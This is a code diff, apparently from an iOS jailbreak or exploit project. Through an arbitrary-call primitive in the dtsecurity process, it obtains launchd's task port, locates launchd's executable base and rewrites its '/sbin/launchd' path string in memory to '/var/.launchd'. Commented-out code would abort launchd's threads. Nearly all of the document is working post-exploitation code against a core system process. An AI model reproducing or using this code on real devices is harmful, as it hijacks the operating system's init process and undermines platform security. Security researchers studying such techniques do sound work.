@@ -12,6 +12,25 @@
 #include "Header.h"
 #include <sys/wait.h>
 
+vm_offset_t findSbinLaunchdOff(void) {
+    char *path = "/sbin/launchd";
+    int fd = open(path, O_RDONLY);
+    struct stat s;
+    fstat(fd, &s);
+    const struct mach_header_64 *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
+    assert(map != MAP_FAILED);
+    
+    size_t size = 0;
+    char *cstring = (char *)getsectiondata(map, SEG_TEXT, "__cstring", &size);
+    assert(cstring);
+    while (strcmp(cstring, "/sbin/launchd") != 0) {
+        cstring += strlen(cstring) + 1;
+    }
+    
+    munmap((void *)map, s.st_size);
+    close(fd);
+    return cstring - (char *)map;
+}
 
 @interface ViewController ()
 @property(nonatomic) mach_port_t exceptionPort;
@@ -115,31 +134,50 @@
 
 - (void)arbCallButtonTapped {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        kern_return_t kr;
+        // Create a region which holds temp data (should we use stack instead?)
         vm_size_t shared_size = getpagesize();
         vm_address_t map = RemoteArbCall(mmap, 0, shared_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
         printf("Mapped memory at 0x%lx\n", map);
         
-        // Get my task port
-        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(task_self_trap);
-        kern_return_t kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, getpid(), map);
-        if (kr != KERN_SUCCESS) {
-            printf("Failed to get my task port\n");
-            return;
-        }
-        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
-        // Map the page we allocated in dtsecurity to this process
-        kr = (kern_return_t)RemoteArbCall(vm_remap, my_task, map, shared_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
-        if (kr != KERN_SUCCESS) {
-            printf("Failed to create dtsecurity<->haxx shared mapping\n");
-            return;
-        }
-        vm_address_t local_map = RemoteRead64(map);
-        printf("Created shared mapping: 0x%lx\n", local_map);
-        printf("read: 0x%llx\n", *(uint64_t *)local_map);
-        
         // Test mkdir
         RemoteWriteString(map, "/tmp/.it_works");
         RemoteArbCall(mkdir, map, 0700);
+        
+        // Get my task port
+        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(task_self_trap);
+//        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, getpid(), map);
+//        if (kr != KERN_SUCCESS) {
+//            printf("Failed to get my task port\n");
+//            return;
+//        }
+//        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
+        // Map the page we allocated in dtsecurity to this process
+//        kr = (kern_return_t)RemoteArbCall(vm_remap, my_task, map, shared_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
+//        if (kr != KERN_SUCCESS) {
+//            printf("Failed to create dtsecurity<->haxx shared mapping\n");
+//            return;
+//        }
+//        vm_address_t local_map = RemoteRead64(map);
+//        printf("Created shared mapping: 0x%lx\n", local_map);
+//        printf("read: 0x%llx\n", *(uint64_t *)local_map);
+        
+        // Get dtsecurity dyld base for blr x19
+        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
+         kr = (kern_return_t)RemoteArbCall(task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
+        if (kr != KERN_SUCCESS) {
+            printf("task_info failed\n");
+            return;
+        }
+        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
+        vm_address_t remote_dyld_base;
+        do {
+            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
+            // FIXME: why do I have to sleep a bit for dyld base to be available?
+            usleep(100000);
+        } while (remote_dyld_base == 0);
+        printf("dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
+        blrX19Address = remote_dyld_base + blrX19Offset;
         
         // Get launchd task port
         kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, 1, map);
@@ -151,33 +189,63 @@
         mach_port_t launchd_task = (mach_port_t)RemoteRead32(map);
         printf("Got launchd task port: %d\n", launchd_task);
         
-        // Get remote dyld base for blr x19
+        // Get remote dyld base
         RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
         kr = (kern_return_t)RemoteArbCall(task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
         if (kr != KERN_SUCCESS) {
             printf("task_info failed\n");
             return;
         }
-        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = *(void**)(local_map + 8) + offsetof(struct task_dyld_info, all_image_info_addr);
-        vm_address_t remote_dyld_base;
-        do {
-            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
-            // FIXME: why do I have to sleep a bit for dyld base to be available?
-            usleep(100000);
-        } while (remote_dyld_base == 0);
-        printf("launchd dyld base: 0x%lx\n", remote_dyld_base);
+        remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
+        printf("launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
+        
+        //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
+        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
+            return;
+        }
+        
+        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, RemoteRead64(map), sizeof(uint64_t), map, map + 8);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_read_overwrite infoArray[0] failed\n");
+            return;
+        }
+        
+        vm_address_t launchd_base = RemoteRead64(map);
+        printf("Found main executable base: 0x%lx\n", launchd_base);
+        
+        // Reprotect rw
+        vm_offset_t launchd_str_off = findSbinLaunchdOff();
+        
+        kr = (kern_return_t)RemoteArbCallBLR(vm_protect, launchd_task, launchd_base + launchd_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_protect failed\n");
+            return;
+        }
+        
+        // Overwrite /sbin/launchd string to /var/.launchd
+        const char *newPath = "/var/.launchd";
+        RemoteWriteString(map, newPath);
+        kr = (kern_return_t)RemoteArbCallBLR(vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
+        if (kr != KERN_SUCCESS) {
+            printf("vm_write failed\n");
+            return;
+        }
+        
+        printf("Successfully overwrote launchd executable path string to %s\n", newPath);
         
         // stuff
-        uint64_t remote_list = map + sizeof(uint64_t);
-        RemoteArbCall(task_threads, launchd_task, remote_list, map);
-        mach_msg_type_number_t listCnt = *(uint32_t *)local_map;
-        RemoteArbCall(memcpy, remote_list, RemoteRead64(remote_list), listCnt * sizeof(uint64_t));
-        thread_act_array_t act_list = (void *)local_map + sizeof(uint64_t);
-        for (int i = 0; i < listCnt; i++) {
-            printf("Thread[%d] = 0x%x\n", i, act_list[i]);
-            // panic your launchd
-            //RemoteArbCall(thread_abort, act_list[i]);
-        }
+//        uint64_t remote_list = map + sizeof(uint64_t);
+//        RemoteArbCall(task_threads, launchd_task, remote_list, map);
+//        mach_msg_type_number_t listCnt = *(uint32_t *)local_map;
+//        RemoteArbCall(memcpy, remote_list, RemoteRead64(remote_list), listCnt * sizeof(uint64_t));
+//        thread_act_array_t act_list = (void *)local_map + sizeof(uint64_t);
+//        for (int i = 0; i < listCnt; i++) {
+//            printf("Thread[%d] = 0x%x\n", i, act_list[i]);
+//            // panic your launchd
+//            RemoteArbCall(thread_abort, act_list[i]);
+//        }
         
 //        arm_thread_state64_internal ts;
 //        RemoteArbCall(memset, map+0x10, 0x41, sizeof(ts));
